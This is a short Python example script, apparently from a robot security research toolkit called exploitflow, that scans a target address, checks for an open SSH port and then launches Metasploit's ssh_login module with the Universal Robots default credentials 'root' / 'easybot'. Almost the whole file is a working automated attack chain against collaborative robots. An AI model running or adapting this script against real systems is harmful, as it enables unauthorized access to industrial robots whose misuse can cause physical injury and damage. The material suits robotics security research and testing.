# Copyright 2022 VÃ­ctor Mayoral-Vilches. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# A exploit flow that footprints and sends attempts exploits a Universal Robots
# cobot with default credentials

import exploitflow as ef
from exploitflow.state import State_v2
State_default = State_v2


flow = ef.Flow()
init = ef.Init()

recon = ef.Targets()
versions = ef.Versions(ports=ef.state.TARGET_PORTS_COMPLETE)

# initialize state and pass it over a recon action
# resulting flow should deliver a state annotated
# with the results from the reconnaissance step
state = flow.run(init * recon * versions, target="192.168.2.10")

# for those states that have a 22 port open, send an ssh 
# exploit attempt using metasploit
for s in state.states.keys():
    # check if port 22 is open, which technically means
    # that the ssh service is running
    if any((port_state.port == 22 and port_state.open) for port_state in state.states[s].ports):

        # Build MSF ssh test exploit
        expl = ef.adapter_msf_initializer.get_name("auxiliary", "scanner/ssh/ssh_login")
        msf_options = {
            "RHOSTS": s,
            "USERNAME": "root",
            "PASSWORD": "easybot"
        }        
        expl.set_options(msf_options)

        if not expl.missing():
            state = flow.run(state * expl, target=s, debug=False)

print(flow)

# ASCII-depict graph
print(flow.ascii())
flow.to_dot("/tmp/exploitflow.dot")